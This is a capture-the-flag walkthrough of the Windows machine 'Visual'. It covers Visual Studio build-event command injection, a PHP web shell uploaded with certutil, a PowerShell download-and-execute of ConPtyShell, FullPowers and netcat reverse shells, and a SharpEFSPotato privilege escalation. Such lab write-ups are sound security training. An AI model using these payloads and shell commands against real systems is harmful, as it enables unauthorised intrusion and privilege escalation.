# Machine Overview

Visual was ranked as a **medium** Windows Server 2019 machine, which involves abusing the **PreBuildEvent** and **PostBuildEvent** features of Visual Studio. These features are vulnerable to **command injection** which will be used to gain shell as **Enox** user. For root access, we discovered that the **htdocs** folder has permissions that allow the user **Enox** to create and execute code. We abused this permission to elevate privileges to the **nt authority\local service** account through the web browser. Then, we used **FullPowers.exe** to regain our permissions. With **SeImpersonate** privileges on our **local service** account, we performed a **Potato** attack. We ran **SharpEFSPotato.exe**, which impersonates our user's privilege with the privileges of the admin account. Finally, we obtained root access on the machine.

## Scanning through Nmap

First, we'll use Nmap to scan the whole network and find out what services are running. With the **-p-** option, we can check all **65535** ports, and by adding **--min-rate 10000**, we can make the scan faster. After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

```shell
$ nmap -p- --min-rate 10000 10.10.11.234 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
80
```

Now let's run a detailed scan on these specific ports using...

```bash
$ nmap -p80 -sC -sV -A -T4 10.10.11.234 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```Nmap
Nmap scan report for 10.10.11.234 (10.10.11.234)
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual Revolutionizing Visual Studio Builds

```

We found that the server is running Apache 2.4.56 and PHP 8.1.17. Let's explore what's on port 80. Essentially, the server fetches a GitHub repository link containing a .sln file, which is a solution file used to organize a project. Visual Studio then processes and builds the project for us. Currently, it supports .NET 6.0 and C#. To exploit this, we need to install the .NET 6.0 version on our machine to create a project.

After some research, I discovered that we can exploit the built-in features of Visual Studio, specifically the **PreBuildEvents** and **PostBuildEvents**, for remote code execution. These features run **PowerShell** commands directly, allowing an attacker to perform actions such as **NTLM** theft or gain remote code execution (RCE). You can learn more about it [here](https://outflank.nl/blog/2023/03/28/attacking-visual-studio-for-initial-access/). Here's the vulnerable functionality we can exploit to gain initial access

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <PreBuildEvent>"<Our shell Here>"</PreBuildEvent>
  </PropertyGroup>
</Project>
```

Since the machine lacks internet access, we'll host the exploit locally on our own server. To make our exploit successful, we need three things:
- A .NET project
- Git Repo of that project
- Hosting the repository on our local server, such as Apache or Nginx. A Python server won't work; I've tried it before.
Let's begin with the .NET project. Don't worry; you can learn how to set it up [here](https://dotnet.microsoft.com/en-us/learn/dotnet/hello-world-tutorial/create) Just ensure to create the project using version 6.0, not 7.0.

```bash
$ dotnet new console -o MyApp -f net6.0
$ cd MyApp

# to check if it created successfully run 
$ dotnet run
```

Our project has been successfully created. Let's move into the project directory and run `dotnet new sln` and, after that, `dotnet sln add MyApp.csproj` because we also need to add a.sln file to it. To get shell, we need to put our revshell code into the `MyApp.csproj` file in between `<PreBuildEvent>"Shell here"</PreBuildEvent>`. You can use the best website called **Revshells.com** for it. We will use the **PowerShell base64** shell here.

```bash
$ dotnet new sln
$ dotnet sln add MyApp.csproj
```

```c#
# MyApp.csproj

    </Target>

</Project>
```

Now, Lets create a git repository in our current directory and add all the files in it using commands:

```bash
$ git init
$ git add .
$ git commit -m 'Initial'
$ git clone --bare MyApp proj.git
$ touch proj.git/git-daemon-export-ok
```

![Pasted image 20240224203312](https://github.com/iammR0OT/HTB/assets/74102381/4a514913-7f5d-4058-ad94-922e6b6079a9)

Now, let's make the project public via an HTTP server. You can learn more about this process [here](https://git-scm.com/docs/user-manual) and [here](https://mirrors.edge.kernel.org/pub/software/scm/git/docs/user-manual.html#setting-up-a-public-repository).

First, clone our repository as a bare git project. Then, create a **git-daemon-export-ok** file in the **proj.git** directory. Next, move this repository to the server. If you're using an Apache Server like me, place it in the **/var/www/html** folder.

In the **proj.git** folder, update the server info by running `git --bare update-server-info`. Also, ensure that you rename the **post-update.sample** file to **post-update** in the **hooks** folder. Now, our project is ready to be accessed via the HTTP server

```bash 
$ sudo mv proj.git /var/www/html
$ cd proj.git
$ git --bare update-server-info
$ mv hooks/post-update.sample hooks/post-update
```

Start a listener on your machine.

```bash
sudo nc -lvnp 445
```

- **-l** for listen mode
- **-v** for verbosity
- **-n** for name resolution 
- **-p** for specifying the local port number

Paste your git URL into the web browser so that it retrieves files from our Git repository and builds a program for us.

![Pasted image 20240224204423](https://github.com/iammR0OT/HTB/assets/74102381/d44dd36c-8da6-48b5-96d0-696b8a98fef6)

Let's run it and check what happens. It is building the project for us.

![Pasted image 20240205205721](https://github.com/iammR0OT/HTB/assets/74102381/9feb3a94-fd85-40ad-838f-23d0719500f4)
 
Within no time, we got a reverse shell back on our **netcat listener**.

![Pasted image 20240224211236](https://github.com/iammR0OT/HTB/assets/74102381/faf48074-a2a9-43d1-af3e-d4b048d36956)
  
And our user flag is present in the user **enox** desktop folder.

![Pasted image 20240224211324](https://github.com/iammR0OT/HTB/assets/74102381/893c0906-44de-4284-a339-b2b7cb9a08a5)

# Privilege Escalation

Let's check what privileges we have as a logged-in user account using `whoami /priv`.

![Screenshot from 2023-10-13 13-00-33](https://github.com/iammR0OT/HTB/assets/74102381/784aabc4-e1b3-460a-bfa9-8f2aeac9741b)
 
We didn't find any interesting things there. Let's run `icacls` to check folder permissions to see if we have any useful folders or files. We found a folder named `htdocs` in the **xampp** directory that has all the permissions. The last **(F)** denotes that everyone has full access to this folder.

![Pasted image 20240224211524](https://github.com/iammR0OT/HTB/assets/74102381/e5203f69-aac4-4aa8-8557-8650bb3275af)
  
Let's create a simple **shell.php** file that includes a **cmd** command.

```php
<?php system($_GET['cmd']); ?>
```

Now upload it on the machine using **certutil**. **Certutil** is a tool used to manage certificates in Windows. We can use it to download files on the machine using 

```powershell
certutil.exe -urlcache -f http://10.10.16.3:8000/shell.php'
```

First, run a Python server on your local machine using

```bash
python3 -m http.server 8000
```

![Pasted image 20240224211728](https://github.com/iammR0OT/HTB/assets/74102381/7453d203-0df3-4d87-8bc7-7f3bfadd404f)

Now, upload it to the machine using

```powershell
certutil.exe -urlcache -f http://10.10.14.59:8081/shell.php
```

![Pasted image 20240224211801](https://github.com/iammR0OT/HTB/assets/74102381/e9119bc7-c821-409e-82ae-8463819750da)

We have our **shel.php** file on our machine; let's access it on the web browser, and here we have a `nt authority\local service` account.

![Pasted image 20240224211831](https://github.com/iammR0OT/HTB/assets/74102381/4b06c3ac-dff8-45a9-a1d4-201bfecd2b50)

Let's try to get a shell as a `nt authority\local service` account because with that user, we can get more permissions in the network. To get a stable and fully interactive shell on Windows, we will use the "**conptyshell**." Since echo is enabled on Windows by default, we need to run

```bash 
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

To get the interactive shell, which is described in the Description portion of ConPtyShell, you can learn more about it [here](https://github.com/antonioCoco/ConPtyShell). First, clone it to your local system and start a listener there and set

```bash
she.php?cmd=powershell.exe  -nop -ep bypass -c "IEX(IWR http://10.10.16.3:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.16.3 3001"
``` 

After IP to get executed. Basically, it is getting ConPtyShell from our machine, running it, and trying to connect to our new listener, which is running on the 3001 local port.

![Pasted image 20240224212231](https://github.com/iammR0OT/HTB/assets/74102381/01c42ecd-ad10-4e57-abef-4b84bdb6257c)

All set, let's run this and we got a shell back as a **nt authority\ local service** user.

![Pasted image 20240224213017](https://github.com/iammR0OT/HTB/assets/74102381/45e6bba5-be68-4dc5-b25d-2b6005bcb875)

Now we have a `local service` account with limited permissions, but there is a vulnerability that uses the task scheduler to regain all permissions because `local service` accounts have permissions to create their own tasks or schedule them, which will help us regain all our permissions. You can learn about how it works [here](https://itm4n.github.io/localservice-privileges/). For this, we will use a tool called `FullPowers.exe`, which is an automated way to regain permissions using the task scheduler. Download it from GitHub and then transfer it to the machine using the same method we used to transfer the `shel.php` file, using **Certutils**. We will use example 3 from **FullPowers** **GitHub repo**, which you can get from [here](https://github.com/itm4n/FullPowers). Let's move it to the target machine.

![Pasted image 20240224212523](https://github.com/iammR0OT/HTB/assets/74102381/4c2b007f-0c8a-4945-b25d-b3104e7259b8)

![Pasted image 20240224212712](https://github.com/iammR0OT/HTB/assets/74102381/9ee33e22-5e28-4cf9-96c2-72b160ca08d6)

Now we have both **FullPowers.exe** and **nc64.exe** on the machine. Let's run a listener and execute **FullPowers.exe** using the following command:

```powershell
.\full -c "C:\Users\Public\nc.exe 10.10.16.3 9001 -e cmd" -z
```

![Pasted image 20240224212858](https://github.com/iammR0OT/HTB/assets/74102381/737702d0-7284-4a30-b770-ec48a0953d3c)

And we got a shell back 

![Pasted image 20240224213124](https://github.com/iammR0OT/HTB/assets/74102381/461e6c2c-2b74-4587-9def-98e3d45a86d0)

Now we have all of the permissions back.

![Pasted image 20240224213058](https://github.com/iammR0OT/HTB/assets/74102381/1ace209c-fd51-44d1-8e31-13f9b423058e)

Now that we have the **SeImpersonatePrivilege** enabled, we can execute the **Potato Attack** to impersonate admin permissions. Since the target machine is running Windows Server 2019, we can utilize **SharpEFSPotato** to read files from the admin account. **SharpPotato** utilizes **EfsRpc** to access files from the admin account using the **Encrypting File System Remote (EFSRPC)** Protocol, which facilitates maintenance and management operations on encrypted data stored remotely and accessed over a network.

![Pasted image 20240224213254](https://github.com/iammR0OT/HTB/assets/74102381/cec13de4-99df-40c4-a1a7-9739e0f34462)

Let's download it and transfer it to the target machine using **certutil.exe**. It utilizes PowerShell to read and store files. We'll use **Get-Content** and **Set-Content** PowerShell commands to read a file from the admin account and write it to the specified destination. For this, we will use the following command:

```powershell
.\sha.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "Get-Content C:\Users\Administrator\Desktop\root.txt | Set-Content C:\Users\Public\b.log"
```

![Pasted image 20240224214126](https://github.com/iammR0OT/HTB/assets/74102381/046f062f-130a-4b84-90f1-ea4f460e35b8)

We got root flag.
